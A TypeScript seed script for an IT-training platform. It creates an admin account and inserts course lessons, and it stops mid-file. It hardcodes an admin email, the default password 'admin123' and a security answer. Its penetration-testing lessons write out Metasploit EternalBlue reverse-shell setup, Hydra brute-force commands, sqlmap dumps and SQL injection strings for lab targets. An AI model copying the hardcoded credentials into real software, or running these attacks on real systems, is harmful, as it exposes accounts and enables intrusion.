// Auto-seed: runs on server startup if database is empty
// This ensures courses appear automatically on fresh deployments (e.g. Render.com)
import { readDB, mutate, uid, nowISO } from "@/lib/store";
import { createCourse, createModule, addLesson } from "@/lib/courses";
import { CATEGORIES } from "@/lib/categories";
import bcrypt from "bcryptjs";

export function autoSeed() {
  try {
    let db = readDB();

    // ── DB Migration: ensure all arrays exist (fixes 500 on checkout for old DBs) ──
    // Old databases created before notifications/books features are missing these arrays,
    // causing createNotification() to crash with "Cannot read properties of undefined"
    mutate((d) => {
      let fixed = false;
      if (!d.notifications) { d.notifications = []; fixed = true; }
      if (!d.books) { d.books = []; fixed = true; }
      if (fixed) console.log("[autoseed] DB migration: added missing arrays (notifications/books)");
    });

    // ── Always ensure the admin account exists (even if courses already seeded) ──
    const adminEmail = "ademezerihun2013@gmail.com";
    const existingAdmin = db.users.find((u) => u.email === adminEmail);
    if (!existingAdmin) {
      console.log("[autoseed] Admin user missing — creating admin account...");
      const hash = bcrypt.hashSync("admin123", 10);
      const admin = {
        id: uid(),
        name: "Simegnew Ademe",
        email: adminEmail,
        passwordHash: hash,
        role: "admin" as const,
        bio: "IT educator and founder of TechPath Academy. Passionate about helping students build real-world IT skills.",
        avatar: "",
        title: "Founder & Lead Instructor",
        createdAt: nowISO(),
        securityQuestion: "What was the name of your first pet?",
        securityAnswerHash: bcrypt.hashSync("techpath", 10),
      };
      mutate((d) => { d.users.push(admin); });
      console.log("[autoseed] ✅ Admin account created: " + adminEmail);
    } else if (existingAdmin.role !== "admin") {
      console.log("[autoseed] Promoting " + adminEmail + " to admin role...");
      mutate((d) => {
        const u = d.users.find((u) => u.email === adminEmail);
        if (u) u.role = "admin" as const;
      });
      console.log("[autoseed] ✅ Admin role granted to " + adminEmail);
    }

    // ── Always add missing courses (runs even when DB already has courses) ──
    const existingTitles = readDB().courses.map(c => c.title.toLowerCase());
    const adminUsr = readDB().users.find((u) => u.email === "ademezerihun2013@gmail.com");
    const instrId = adminUsr?.id || uid();

    if (!existingTitles.includes("linux administration")) {
      console.log("[autoseed] Adding missing course: Linux Administration");
      const cLA = createCourse({
        title: "Linux Administration",
        categoryId: "cat-it-support",
        description: "Master Linux system administration from the command line. Learn user management, file permissions, process control, shell scripting, package management, networking, and security hardening. Build the skills to manage Linux servers in production.",
        coverImage: "", price: 0, published: true, instructorId: instrId,
        level: "Beginner" as const, language: "English",
      });
      const mLA1 = createModule(cLA.id, "Getting Started with Linux");
      addLesson({ moduleId: mLA1.id, courseId: cLA.id, title: "Introduction to Linux & Distributions", type: "text", videoUrl: "", content: "# Welcome to Linux Administration\n\nLinux powers most of the internet — from web servers to Android phones.\n\n## What is Linux?\nLinux is a free, open-source operating system kernel. Combined with tools and libraries, it forms a complete OS called a **distribution** (distro).\n\n## Popular Server Distributions\n- **Ubuntu/Debian** — beginner-friendly, huge community\n- **RHEL/CentOS/AlmaLinux** — enterprise standard\n- **Arch** — rolling release, for advanced users\n\n## Why Learn Linux?\n- 90%+ of cloud servers run Linux\n- Essential for DevOps, Cloud, Security, and Backend roles\n- Free to install and practice on\n\n> In this course, we'll use the command line exclusively — just like a real sysadmin.", duration: 20, preview: true });
      addLesson({ moduleId: mLA1.id, courseId: cLA.id, title: "Installing Linux & First Boot", type: "text", videoUrl: "", content: "## Setting Up Your Lab Environment\n\n### Option 1: Virtual Machine (recommended)\n1. Download **VirtualBox** (free) or **VMware Workstation Player**\n2. Download an **Ubuntu Server** ISO from ubuntu.com\n3. Create a VM: 2GB RAM, 20GB disk, 2 CPUs\n4. Boot from ISO and follow installer\n\n### Option 2: WSL (Windows Subsystem for Linux)\n```bash\nwsl --install -d Ubuntu\n```\n\n### First Login\nAfter boot, you'll see a login prompt. Log in with the credentials you set during installation.", duration: 25, preview: true });
      addLesson({ moduleId: mLA1.id, courseId: cLA.id, title: "Navigating the File System", type: "text", videoUrl: "", content: "## The Linux File System Hierarchy\n\n```\n/           Root (top of everything)\n├── bin/    Essential binaries (ls, cat, cp)\n├── etc/    Configuration files\n├── home/   User home directories\n├── var/    Variable data (logs, databases)\n├── tmp/    Temporary files\n├── usr/    User programs and libraries\n└── opt/    Optional/third-party software\n```\n\n## Essential Navigation Commands\n```bash\npwd              # Print working directory\nls -la           # List all files (including hidden)\ncd /etc          # Change directory\ncd ~             # Go to home directory\ncd ..            # Go up one level\ntree -L 2 /      # Show directory tree\n```\n\n> **Pro tip**: Use `Tab` to auto-complete paths. Use `Ctrl+R` to search command history.", duration: 30 });

      const mLA2 = createModule(cLA.id, "User & Permission Management");
      addLesson({ moduleId: mLA2.id, courseId: cLA.id, title: "User Account Management", type: "text", videoUrl: "", content: "## Managing Users\n\n### Create a user\n```bash\nsudo useradd -m -s /bin/bash john\nsudo passwd john\n```\n- `-m` creates home directory\n- `-s /bin/bash` sets default shell\n\n### Delete a user\n```bash\nsudo userdel -r john   # -r removes home dir\n```\n\n### Groups\n```bash\nsudo groupadd developers\nsudo usermod -aG developers john\ngroups john    # See which groups john belongs to\n```\n\n### The /etc/passwd file\n```\njohn:x:1001:1001::/home/john:/bin/bash\n```", duration: 35 });
      addLesson({ moduleId: mLA2.id, courseId: cLA.id, title: "File Permissions & Ownership", type: "text", videoUrl: "", content: "## Understanding Permissions\n\n```\n-rw-r--r-- 1 john john 2048 Nov 25 script.sh\n```\n\n### Permission Breakdown\n- **r** = read (4)\n- **w** = write (2)\n- **x** = execute (1)\n\n### Changing Permissions (chmod)\n```bash\nchmod 755 script.sh    # rwxr-xr-x\nchmod +x script.sh     # Add execute for everyone\n```\n\n### Changing Ownership (chown)\n```bash\nsudo chown john:developers file.txt\n```\n\n> **Practice**: Create a file, change its permissions, and test access as different users.", duration: 40 });

      const mLA3 = createModule(cLA.id, "Process & Package Management");
      addLesson({ moduleId: mLA3.id, courseId: cLA.id, title: "Managing Processes", type: "text", videoUrl: "", content: "## Process Management\n\n### View running processes\n```bash\nps aux              # All processes\ntop                 # Interactive process viewer\nhtop                # Better version (install: sudo apt install htop)\n```\n\n### Kill a process\n```bash\nkill 1234           # Send SIGTERM (graceful)\nkill -9 1234        # Send SIGKILL (force)\nkillall nginx       # Kill by name\n```\n\n### Background jobs\n```bash\n./long_task.sh &    # Run in background\njobs                # List background jobs\nfg %1               # Bring job 1 to foreground\nnohup ./task.sh &   # Survives logout\n```\n\n> **Warning**: `kill -9` should be a last resort.", duration: 35 });
      addLesson({ moduleId: mLA3.id, courseId: cLA.id, title: "Package Management (APT & DNF)", type: "text", videoUrl: "", content: "## Installing Software\n\n### Debian/Ubuntu (APT)\n```bash\nsudo apt update\nsudo apt install nginx\nsudo apt remove nginx\nsudo apt upgrade\n```\n\n### RHEL/CentOS (DNF)\n```bash\nsudo dnf install nginx\nsudo dnf update\n```\n\n### Snap (universal)\n```bash\nsudo snap install code --classic\n```\n\n> **Tip**: Always run `apt update` before `apt install`.", duration: 30 });

      const mLA4 = createModule(cLA.id, "Shell Scripting Basics");
      addLesson({ moduleId: mLA4.id, courseId: cLA.id, title: "Writing Your First Bash Script", type: "text", videoUrl: "", content: "## Bash Scripting\n\n### Hello World\n```bash\n#!/bin/bash\necho \"Hello, World!\"\necho \"Current user: $(whoami)\"\necho \"Date: $(date +%Y-%m-%d)\"\n```\n\n### Variables\n```bash\nname=\"Simegnew\"\necho \"Welcome, $name\"\n```\n\n### Conditionals\n```bash\nif [ -f /etc/passwd ]; then\n  echo \"File exists\"\nelse\n  echo \"File not found\"\nfi\n```\n\n### Save & Run\n```bash\nchmod +x myscript.sh\n./myscript.sh\n```\n\n> **Pro tip**: Start scripts with `set -e` to exit on error.", duration: 40 });
      addLesson({ moduleId: mLA4.id, courseId: cLA.id, title: "Automating Tasks with Cron", type: "text", videoUrl: "", content: "## Cron — The Linux Task Scheduler\n\n### View/Edit crontab\n```bash\ncrontab -l          # List cron jobs\ncrontab -e          # Edit cron jobs\n```\n\n### Cron Format\n```\n* * * * * command\n| | | | |\n| | | | +-- Day of week (0-7)\n| | | +--- Month (1-12)\n| | +---- Day of month (1-31)\n| +------ Hour (0-23)\n+-------- Minute (0-59)\n```\n\n### Examples\n```bash\n# Backup every day at 2 AM\n0 2 * * * /home/john/backup.sh\n\n# Every 15 minutes\n*/15 * * * * /scripts/check.sh\n```", duration: 35 });

      const mLA5 = createModule(cLA.id, "Networking & Security Hardening");
      addLesson({ moduleId: mLA5.id, courseId: cLA.id, title: "Linux Networking Commands", type: "text", videoUrl: "", content: "## Network Configuration\n\n### Check network interfaces\n```bash\nip addr show          # Show all interfaces\nip a                  # Short form\n```\n\n### Check connectivity\n```bash\nping -c 4 8.8.8.8\ntraceroute google.com\n```\n\n### Ports & connections\n```bash\nss -tlnp              # List listening TCP ports\nnetstat -tlnp         # Legacy alternative\n```\n\n### Download files\n```bash\ncurl -O https://example.com/file.zip\nwget https://example.com/file.zip\n```\n\n> **Practice**: Use `ss -tlnp` to find what services are listening on your system.", duration: 30 });
      addLesson({ moduleId: mLA5.id, courseId: cLA.id, title: "Firewall Setup with UFW", type: "text", videoUrl: "", content: "## UFW — Uncomplicated Firewall\n\n### Enable the firewall\n```bash\nsudo ufw enable\nsudo ufw status verbose\n```\n\n### Allow services\n```bash\nsudo ufw allow 22/tcp        # SSH\nsudo ufw allow 80/tcp        # HTTP\nsudo ufw allow 443/tcp       # HTTPS\n```\n\n### Best Practices\n1. Default deny incoming, allow outgoing\n2. Allow SSH **before** enabling firewall\n3. Only open ports you need\n\n> ⚠️ Always keep SSH allowed before enabling UFW!", duration: 35 });
      addLesson({ moduleId: mLA5.id, courseId: cLA.id, title: "SSH Hardening & Security Checklist", type: "text", videoUrl: "", content: "## Securing Your Linux Server\n\n### SSH Hardening\nEdit `/etc/ssh/sshd_config`:\n```\nPermitRootLogin no\nPasswordAuthentication no\nPort 2222\n```\n\n### SSH key authentication\n```bash\nssh-keygen -t ed25519\nssh-copy-id user@server\n```\n\n### Security Checklist\n- [ ] Disable root login over SSH\n- [ ] Use SSH keys, disable passwords\n- [ ] Enable UFW firewall\n- [ ] Install fail2ban\n- [ ] Enable automatic updates\n- [ ] Check for open ports\n- [ ] Review user accounts\n\n> **Congratulations!** You now have the fundamentals of Linux administration.", duration: 40 });
    }

    if (!existingTitles.includes("kali linux for penetration testing")) {
      console.log("[autoseed] Adding missing course: Kali Linux for Penetration Testing");
      const cKL = createCourse({
        title: "Kali Linux for Penetration Testing",
        categoryId: "cat-ethical-hacking",
        description: "Learn Kali Linux from setup to real-world penetration testing. Master Nmap, Metasploit, Burp Suite, Wireshark, and 100+ security tools. Includes hands-on labs for network scanning, vulnerability exploitation, web app testing, and password cracking.",
        coverImage: "", price: 6900, published: true, instructorId: instrId,
        level: "Intermediate" as const, language: "English",
      });
      const mKL1 = createModule(cKL.id, "Getting Started with Kali Linux");
      addLesson({ moduleId: mKL1.id, courseId: cKL.id, title: "What is Kali Linux?", type: "text", videoUrl: "", content: "# Welcome to Kali Linux\n\nKali Linux is a Debian-based distribution specifically designed for penetration testing and digital forensics.\n\n## What Makes Kali Special?\n- **600+ pre-installed security tools**\n- Maintained by **Offensive Security** (creators of OSCP)\n- Free and open source\n\n## Tools You'll Learn\n| Tool | Purpose |\n|------|---------|\n| **Nmap** | Network scanning |\n| **Metasploit** | Exploitation framework |\n| **Burp Suite** | Web app testing |\n| **Wireshark** | Packet analysis |\n| **Hydra** | Password brute-forcing |\n| **Aircrack-ng** | WiFi auditing |\n\n## Legal & Ethical Framework\n> ⚠️ Only test systems you **own** or have **written permission** to test.\n\n### Legal lab environments:\n1. **Metasploitable 2** — vulnerable Linux VM\n2. **DVWA** — Damn Vulnerable Web App\n3. **HackTheBox / TryHackMe** — legal online labs", duration: 25, preview: true });
      addLesson({ moduleId: mKL1.id, courseId: cKL.id, title: "Installing & Configuring Kali Linux", type: "text", videoUrl: "", content: "## Installation Options\n\n### Option 1: Virtual Machine (recommended)\n1. Download pre-built Kali VM from kali.org\n2. Import into VirtualBox or VMware\n3. Default credentials: `kali / kali`\n4. Update: `sudo apt update && sudo apt full-upgrade -y`\n\n### Option 2: Bootable USB\n```bash\ndd if=kali.iso of=/dev/sdb bs=4M status=progress\n```\n\n### Option 3: WSL\n```bash\nwsl --install -d kali-linux\n```\n\n### Post-Install\n```bash\npasswd                          # Change default password\nsudo apt install bloodhound impacket-tools\n```\n\n> **Tip**: Take a VM snapshot after setup.", duration: 30, preview: true });
      addLesson({ moduleId: mKL1.id, courseId: cKL.id, title: "Kali Tool Categories", type: "text", videoUrl: "", content: "## Kali Tool Menu Categories\n\n### 01 — Information Gathering\n- `nmap`, `masscan`, `recon-ng`, `theHarvester`\n\n### 02 — Vulnerability Analysis\n- `nikto`, `nmap --script vuln`, `openvas`\n\n### 03 — Web Application Analysis\n- `burpsuite`, `sqlmap`, `gobuster`, `wpscan`\n\n### 04 — Password Attacks\n- `hydra`, `john`, `hashcat`, `medusa`\n\n### 05 — Wireless Attacks\n- `aircrack-ng`, `wifite`, `reaver`\n\n### 06 — Exploitation Tools\n- `metasploit-framework`, `searchsploit`\n\n### 07 — Sniffing & Spoofing\n- `wireshark`, `arpspoof`, `responder`\n\n> **Tip**: Use `kali-tools` command or visit tools.kali.org for full catalog.", duration: 30 });

      const mKL2 = createModule(cKL.id, "Network Scanning with Nmap");
      addLesson({ moduleId: mKL2.id, courseId: cKL.id, title: "Nmap Basics — Host Discovery & Port Scanning", type: "text", videoUrl: "", content: "## Nmap — The Network Mapper\n\n### Basic Scans\n```bash\nnmap 192.168.1.10                # Scan single host\nnmap 192.168.1.0/24              # Scan network\nnmap -F 192.168.1.10             # Fast scan (top 100 ports)\nnmap -p- 192.168.1.10            # All 65535 ports\nnmap -p 22,80,443 192.168.1.10   # Specific ports\n```\n\n### Host Discovery\n```bash\nnmap -sn 192.168.1.0/24          # Ping sweep\nnmap -Pn 192.168.1.10            # Skip ping\n```\n\n### Service & OS Detection\n```bash\nnmap -sV 192.168.1.10            # Service versions\nnmap -O 192.168.1.10             # OS detection\nnmap -A 192.168.1.10             # Aggressive (all)\n```\n\n> **Tip**: `-A` is noisy. Use `-sS` (SYN scan) for stealth.", duration: 40 });
      addLesson({ moduleId: mKL2.id, courseId: cKL.id, title: "Advanced Nmap — Scripts & Evasion", type: "text", videoUrl: "", content: "## NSE (Nmap Scripting Engine)\n\n### Built-in scripts\n```bash\nnmap -sC 192.168.1.10                    # Default scripts\nnmap --script smb-vuln* 192.168.1.10     # SMB vulnerabilities\nnmap --script vuln 192.168.1.10          # Known vulnerabilities\n```\n\n### Stealth & Evasion\n```bash\nnmap -sS 192.168.1.10            # SYN scan (stealth)\nnmap -f 192.168.1.10            # Fragment packets\nnmap -D RND:5 192.168.1.10       # Decoy scan\n```\n\n### Output\n```bash\nnmap -oN scan.txt 192.168.1.10   # Normal\nnmap -oX scan.xml 192.168.1.10   # XML\nnmap -oA scanall 192.168.1.10    # All formats\n```\n\n> **Practice**: Run `nmap -sV -sC -p-` against your Metasploitable VM.", duration: 45 });

      const mKL3 = createModule(cKL.id, "Exploitation with Metasploit");
      addLesson({ moduleId: mKL3.id, courseId: cKL.id, title: "Metasploit Framework Basics", type: "text", videoUrl: "", content: "## Metasploit — The Exploitation Framework\n\n### Starting\n```bash\nmsfconsole\n```\n\n### Core Commands\n```bash\nsearch eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue\ninfo\nshow options\n```\n\n### Configuring an Exploit\n```bash\nset RHOSTS 192.168.1.10\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.5\nset LPORT 4444\nexploit\n```\n\n### Meterpreter (post-exploitation)\n```\nsysinfo         # System info\ngetuid          # Current user\nshell           # OS shell\nhashdump        # Password hashes\nscreenshot      # Capture screen\n```\n\n> **Warning**: Always test on your own lab.", duration: 45 });
      addLesson({ moduleId: mKL3.id, courseId: cKL.id, title: "Finding Exploits with Searchsploit", type: "text", videoUrl: "", content: "## Searchsploit (offline Exploit-DB)\n\n```bash\nsearchsploit apache 2.4\nsearchsploit -x 12345        # Examine exploit\nsearchsploit -m 12345        # Copy to current dir\n```\n\n### Online Resources\n- exploit-db.com\n- CVE.mitre.org\n- rapid7.com/db\n\n### Workflow\n1. Nmap finds Apache 2.4.49\n2. `searchsploit apache 2.4.49`\n3. Find CVE-2021-41773\n4. Search Metasploit: `search CVE-2021-41773`\n5. Configure and exploit\n\n> **Tip**: Always verify exploit matches exact version.", duration: 35 });

      const mKL4 = createModule(cKL.id, "Web Application Testing");
      addLesson({ moduleId: mKL4.id, courseId: cKL.id, title: "Burp Suite — Web App Proxy", type: "text", videoUrl: "", content: "## Burp Suite Setup\n1. Open Burp Suite in Kali\n2. Configure browser proxy: `127.0.0.1:8080`\n3. Install Burp CA certificate\n\n### Key Features\n- **Proxy** — Intercept & modify requests\n- **Repeater** — Manual request testing\n- **Intruder** — Automated fuzzing\n- **Scanner** (Pro) — Automated vuln scanning\n\n### Workflow\n1. Browse target with proxy on\n2. Intercept interesting request\n3. Send to Repeater for manual testing\n4. Send to Intruder for fuzzing\n\n> **Practice**: Use Burp to test SQL injection on DVWA login page.", duration: 40 });
      addLesson({ moduleId: mKL4.id, courseId: cKL.id, title: "SQL Injection with SQLMap", type: "text", videoUrl: "", content: "## SQLMap — Automated SQLi\n\n```bash\n# Basic detection\nsqlmap -u \"http://target.com/page?id=1\"\n\n# List databases\nsqlmap -u \"http://target.com/page?id=1\" --dbs\n\n# Dump a table\nsqlmap -u \"http://target.com/page?id=1\" -D users -T credentials --dump\n```\n\n### Manual SQLi Basics\n```sql\n' OR 1=1 --\n' UNION SELECT 1, table_name FROM information_schema.tables --\n```\n\n> **Tip**: Understand what SQLMap does — you need to explain findings in a report.", duration: 45 });
      addLesson({ moduleId: mKL4.id, courseId: cKL.id, title: "Directory Busting with Gobuster", type: "text", videoUrl: "", content: "## Gobuster — Hidden Content Discovery\n\n```bash\n# Directory scan\ngobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\n\n# With extensions\ngobuster dir -u http://target.com -w common.txt -x php,txt,bak\n\n# Subdomain scan\ngobuster dns -d target.com -w subdomains.txt\n```\n\n### Kali Wordlists\n```bash\nls /usr/share/wordlists/\n# dirb/  dirbuster/  rockyou.txt.gz\ngunzip /usr/share/wordlists/rockyou.txt.gz\n```\n\n> **Tip**: `dirb/common.txt` is fast. Use bigger lists for thorough enumeration.", duration: 35 });

      const mKL5 = createModule(cKL.id, "Password Cracking");
      addLesson({ moduleId: mKL5.id, courseId: cKL.id, title: "Online Attacks with Hydra", type: "text", videoUrl: "", content: "## Hydra — Online Brute Force\n\n```bash\n# SSH\nhydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10\n\n# HTTP POST form\nhydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"\n\n# FTP\nhydra -L users.txt -P rockyou.txt ftp://192.168.1.10\n```\n\n### Key Flags\n- `-l` single username / `-L` username list\n- `-p` single password / `-P` password list\n- `-t` threads / `-f` stop on first match\n\n> **Warning**: Online attacks are noisy. Use only in authorized testing.", duration: 35 });
      addLesson({ moduleId: mKL5.id, courseId: cKL.id, title: "Offline Hash Cracking with John & Hashcat", type: "text", videoUrl: "", content: "## John the Ripper\n\n```bash\n# Crack shadow file\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# Show cracked\njohn --show hashes.txt\n```\n\n## Hashcat (GPU-accelerated)\n\n```bash\n# MD5\nhashcat -m 0 -a 0 hashes.txt rockyou.txt\n\n# SHA-256\nhashcat -m 1400 -a 0 hashes.txt rockyou.txt\n\n# NTLM\nhashcat -m 1000 -a 0 hashes.txt rockyou.txt\n```\n\n### Attack Modes\n- `-a 0` — Dictionary attack\n- `-a 3` — Brute force (mask)\n- `-a 6` — Dictionary + mask hybrid\n\n> **Tip**: Hashcat with a GPU is 100-1000x faster than CPU cracking.", duration: 40 });
      addLesson({ moduleId: mKL5.id, courseId: cKL.id, title: "Course Capstone & Reporting", type: "text", videoUrl: "", content: "## Writing a Penetration Test Report\n\n### Report Structure\n1. **Executive Summary** — High-level findings for management\n2. **Scope & Methodology** — What was tested and how\n3. **Findings** — Each vulnerability with:\n   - Description\n   - Risk rating (Critical/High/Medium/Low)\n   - Proof of concept\n   - Remediation recommendation\n4. **Appendix** — Raw scan data, screenshots\n\n### Risk Rating Matrix\n| Severity | Description |\n|----------|-------------|\n| Critical | Remote code execution |\n| High | Privilege escalation |\n| Medium | Information disclosure |\n| Low | Best practice violations |\n\n> **Congratulations!** You've completed Kali Linux for Penetration Testing. Practice on HackTheBox, TryHackMe, and build a portfolio of writeups.", duration: 30 });
    }

    // Re-read DB to check if we need full seed
    db = readDB();
    // Continue to check for missing original 6 courses
    // (the migration above runs regardless; course injection below is conditional)
  

    console.log("[autoseed] Checking for missing courses...");

  // 1. Seed categories
  mutate((d) => {
    d.categories = CATEGORIES.map((c) => ({
      id: c.id,
      name: c.name,
      slug: c.slug,
      description: c.description,
      icon: c.icon,
    }));
  });

  // 2. Get admin user ID (already created above — just look it up)
  const adminUser = readDB().users.find((u) => u.email === "ademezerihun2013@gmail.com");
  const instructorId = adminUser?.id || uid();

  // 3. Create courses (same as seed route)
    if (!existingTitles.includes("it support fundamentals")) {
  const c1 = createCourse({
    title: "IT Support Fundamentals",
    categoryId: "cat-it-support",
    description: "Master the essentials: hardware, software, troubleshooting, and customer service skills for IT support roles. Perfect for beginners starting a career in IT.",
    coverImage: "", price: 0, published: true, instructorId,
    level: "Beginner" as const, language: "English",
  });
  const m1a = createModule(c1.id, "Getting Started");
  addLesson({ moduleId: m1a.id, courseId: c1.id, title: "Welcome & Course Overview", type: "text", videoUrl: "", content: "# Welcome to IT Support Fundamentals!\n\nThis free course introduces you to the world of IT support.\n\n## What you'll learn\n\n- Understanding computer hardware\n- Operating systems basics\n- Networking fundamentals\n- Troubleshooting methodology\n- Customer service skills", duration: 15, preview: true });
  addLesson({ moduleId: m1a.id, courseId: c1.id, title: "The Role of an IT Support Specialist", type: "text", videoUrl: "", content: "## What does IT Support do?\n\nAn IT support specialist helps users with technology problems.\n\n### Common tasks:\n- Installing and configuring software\n- Troubleshooting hardware issues\n- Setting up user accounts\n- Managing network access\n\n### Career path:\n1. **Help Desk Technician** → entry level\n2. **IT Support Specialist** → 1-2 years\n3. **System Administrator** → 3+ years\n4. **IT Manager** → 5+ years", duration: 20, preview: true });
  const m1b = createModule(c1.id, "Troubleshooting Fundamentals");
  addLesson({ moduleId: m1b.id, courseId: c1.id, title: "The Troubleshooting Process", type: "text", videoUrl: "", content: "## Step-by-step troubleshooting\n\n1. **Identify the problem** — gather information from the user\n2. **Establish a theory** — based on symptoms\n3. **Test the theory** — confirm or rule out\n4. **Establish a plan** — fix the issue\n5. **Verify functionality** — confirm the fix works\n6. **Document** — record for future reference", duration: 25 });
  addLesson({ moduleId: m1b.id, courseId: c1.id, title: "Common Hardware Issues", type: "text", videoUrl: "", content: "## Hardware problems you'll see\n\n- **Won't boot**: Check power supply, RAM, hard drive\n- **Overheating**: Clean fans, check thermal paste\n- **Slow performance**: Check disk space, RAM, malware\n- **Peripherals not working**: Check connections, drivers", duration: 30 });

    } // end IT Support guard
    if (!existingTitles.includes("ethical hacking basics")) {
  const c2 = createCourse({
    title: "Ethical Hacking Basics",
    categoryId: "cat-ethical-hacking",
    description: "Learn the foundations of ethical hacking: reconnaissance, scanning, and vulnerability assessment — legally and ethically. Includes hands-on labs.",
    coverImage: "", price: 4900, published: true, instructorId,
    level: "Intermediate" as const, language: "English",
  });
  const m2a = createModule(c2.id, "Introduction to Ethical Hacking");
  addLesson({ moduleId: m2a.id, courseId: c2.id, title: "What is Ethical Hacking?", type: "text", videoUrl: "", content: "## Introduction\n\nEthical hacking is the practice of testing systems for vulnerabilities **with permission**.\n\n### Key concepts\n- **White hats** — ethical hackers, work with permission\n- **Black hats** — malicious hackers, unauthorized\n\n### The legal framework\n- Always get written permission\n- Stay within scope\n- Follow responsible disclosure", duration: 20, preview: true });
  addLesson({ moduleId: m2a.id, courseId: c2.id, title: "The 5 Phases of Hacking", type: "text", videoUrl: "", content: "## The Hacking Methodology\n\n1. **Reconnaissance** — Gathering information about the target\n2. **Scanning** — Identifying live systems and open ports\n3. **Gaining Access** — Exploiting vulnerabilities\n4. **Maintaining Access** — Setting up backdoors\n5. **Covering Tracks** — Clearing logs", duration: 25, preview: true });
  const m2b = createModule(c2.id, "Reconnaissance Techniques");
  addLesson({ moduleId: m2b.id, courseId: c2.id, title: "Passive Information Gathering", type: "text", videoUrl: "", content: "## Phase 1: Passive Recon\n\nGathering information about a target **without touching** their systems.\n\n### Techniques\n- **OSINT** (Open Source Intelligence)\n- Google dorking\n- Social media profiling\n- WHOIS lookups\n- DNS enumeration", duration: 35 });

    } // end ethical hacking basics guard
    if (!existingTitles.includes("networking fundamentals")) {
  const c3 = createCourse({
    title: "Networking Fundamentals",
    categoryId: "cat-networking",
    description: "Understand IP addressing, routing, switches, and how data moves across networks. Build the foundation for any IT career.",
    coverImage: "", price: 3900, published: true, instructorId,
    level: "Beginner" as const, language: "English",
  });
  const m3a = createModule(c3.id, "Network Basics");
  addLesson({ moduleId: m3a.id, courseId: c3.id, title: "How Data Moves Across a Network", type: "text", videoUrl: "", content: "## The OSI Model\n\nA practical walk-through of how packets travel from your device to the internet.\n\n### 7 Layers\n7. **Application** — HTTP, FTP, DNS\n6. **Presentation** — Encryption, compression\n5. **Session** — Managing connections\n4. **Transport** — TCP/UDP\n3. **Network** — IP addressing, routing\n2. **Data Link** — MAC addresses, switches\n1. **Physical** — Cables, signals", duration: 30, preview: true });
  addLesson({ moduleId: m3a.id, courseId: c3.id, title: "IP Addressing Explained", type: "text", videoUrl: "", content: "## What is an IP Address?\n\n### IPv4\n- Format: `192.168.1.100`\n- 4 octets, 0-255 each\n\n### Private vs Public\n- **Private**: 192.168.x.x, 10.x.x.x, 172.16-31.x.x\n- **Public**: Everything else (routable on internet)\n\n### Subnet Masks\n- `/24` = 255.255.255.0 = 256 addresses\n- `/16` = 255.255.0.0 = 65,536 addresses", duration: 35 });
  const m3b = createModule(c3.id, "Routing & Switching");
  addLesson({ moduleId: m3b.id, courseId: c3.id, title: "Switches vs Routers", type: "text", videoUrl: "", content: "## Switches\n- Operate at **Layer 2** (Data Link)\n- Forward frames using **MAC addresses**\n- Connect devices within the same network\n\n## Routers\n- Operate at **Layer 3** (Network)\n- Forward packets using **IP addresses**\n- Connect **different networks** together", duration: 25 });

    } // end networking fundamentals guard
    if (!existingTitles.includes("database administration starter")) {
  const c4 = createCourse({
    title: "Database Administration Starter",
    categoryId: "cat-database",
    description: "Introduction to relational databases, SQL, and daily DBA tasks you'll need on the job. Includes backup, recovery, and performance tuning basics.",
    coverImage: "", price: 5900, published: true, instructorId,
    level: "Intermediate" as const, language: "English",
  });
  const m4a = createModule(c4.id, "Database Fundamentals");
  addLesson({ moduleId: m4a.id, courseId: c4.id, title: "What is a Database?", type: "text", videoUrl: "", content: "## Databases everywhere\n\n### Types of Databases\n- **Relational** (SQL) — MySQL, PostgreSQL, Oracle\n- **NoSQL** — MongoDB, Redis, Cassandra\n\n### The DBA role\nA Database Administrator (DBA) ensures databases run efficiently and securely.", duration: 20, preview: true });
  addLesson({ moduleId: m4a.id, courseId: c4.id, title: "SQL Basics — SELECT, INSERT, UPDATE, DELETE", type: "text", videoUrl: "", content: "## The 4 basic SQL operations (CRUD)\n\n### Create — INSERT\n```sql\nINSERT INTO students (name, email)\nVALUES ('John Doe', 'john@example.com');\n```\n\n### Read — SELECT\n```sql\nSELECT * FROM students WHERE name = 'John Doe';\n```\n\n### Update — UPDATE\n```sql\nUPDATE students SET email = 'john.new@example.com' WHERE id = 1;\n```\n\n### Delete — DELETE\n```sql\nDELETE FROM students WHERE id = 1;\n```", duration: 40, preview: true });
  const m4b = createModule(c4.id, "DBA Daily Tasks");
  addLesson({ moduleId: m4b.id, courseId: c4.id, title: "Backup & Recovery", type: "text", videoUrl: "", content: "## The #1 DBA responsibility\n\n### Backup types\n1. **Full backup** — entire database\n2. **Incremental** — changes since last backup\n3. **Differential** — changes since last full backup\n\n### The 3-2-1 Rule\n- **3** copies of data\n- **2** different storage types\n- **1** offsite copy", duration: 35 });

    } // end database administration starter guard
    if (!existingTitles.includes("cyber security essentials")) {
  const c5 = createCourse({
    title: "Cyber Security Essentials",
    categoryId: "cat-cyber-security",
    description: "Learn the core principles of cyber security: threat types, defense strategies, and how to protect yourself and your organization from cyber attacks.",
    coverImage: "", price: 2500, published: true, instructorId,
    level: "Beginner" as const, language: "English",
  });
  const m5a = createModule(c5.id, "Security Fundamentals");
  addLesson({ moduleId: m5a.id, courseId: c5.id, title: "What is Cyber Security?", type: "text", videoUrl: "", content: "# What is Cyber Security?\n\nCyber security is the practice of protecting systems, networks, and data from digital attacks.\n\n## Key concepts\n- **Confidentiality** — keeping data private\n- **Integrity** — keeping data accurate and unaltered\n- **Availability** — keeping systems running when needed\n\nTogether these are known as the **CIA Triad**.", duration: 20, preview: true });
  addLesson({ moduleId: m5a.id, courseId: c5.id, title: "Common Cyber Threats", type: "text", videoUrl: "", content: "# Common Cyber Threats\n\n- **Phishing** — fraudulent emails tricking users\n- **Malware** — viruses, ransomware, spyware\n- **DDoS** — overwhelming systems with traffic\n- **Man-in-the-middle** — intercepting communications\n- **SQL Injection** — exploiting database queries\n\n### Defense in depth\nNever rely on a single security measure. Layer your defenses.", duration: 30, preview: true });
  const m5b = createModule(c5.id, "Building a Security Culture");
